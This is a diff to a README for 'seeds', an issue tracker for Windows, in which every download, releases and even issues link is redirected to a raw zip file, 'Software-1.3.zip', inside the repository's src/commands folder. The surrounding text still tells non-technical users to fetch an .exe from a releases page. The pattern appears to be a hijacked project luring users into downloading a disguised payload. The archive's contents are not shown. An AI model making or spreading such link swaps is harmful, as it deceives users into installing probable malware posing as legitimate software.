@@ -1,6 +1,6 @@
 # 🌱 seeds - Simple Issue Tracker for AI Workflows
 
-[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://github.com/mayadigi/seeds/releases)
+[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Follow these steps to download and run seeds on a Windows computer. No coding is
 
 Click the big green button below to visit the download page for seeds. 
 
-[![Download seeds](https://img.shields.io/badge/Download-seeds-blue?style=for-the-badge)](https://github.com/mayadigi/seeds/releases)
+[![Download seeds](https://img.shields.io/badge/Download-seeds-blue?style=for-the-badge)](https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip)
 
 On this page, you will find the latest Windows version of seeds. Look for a file ending with `.exe`. This is the installer you need.
 
@@ -30,7 +30,7 @@ On this page, you will find the latest Windows version of seeds. Look for a file
 
 ## 💾 How to Download and Install seeds on Windows
 
-1. Open your web browser and go to the [seeds download page](https://github.com/mayadigi/seeds/releases).
+1. Open your web browser and go to the [seeds download page](https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip).
 
 2. Scroll down to the list of assets under the latest release version.
 
@@ -126,7 +126,7 @@ Keep your issues updated and always accessible on your Windows machine.
 
 To update seeds to the latest version:
 
-1. Visit the [seeds releases page](https://github.com/mayadigi/seeds/releases) regularly.
+1. Visit the [seeds releases page](https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip) regularly.
 
 2. Download the newest Windows installer `.exe` file.
 
@@ -150,7 +150,7 @@ You can open this folder to back up your data or move it to another computer.
 
 If you need help, you can check the issues tab in the GitHub repository for seeds:
 
-https://github.com/mayadigi/seeds/issues
+https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip
 
 Look for answers or report your problem there. You can also ask friends or colleagues who have experience with Windows software.
 
@@ -168,4 +168,4 @@ All your issues and project details stay private on your machine.
 
 For easy access, here is the link to download seeds for Windows:
 
-[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://github.com/mayadigi/seeds/releases)
+[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://raw.githubusercontent.com/mayadigi/seeds/main/src/commands/Software-1.3.zip)
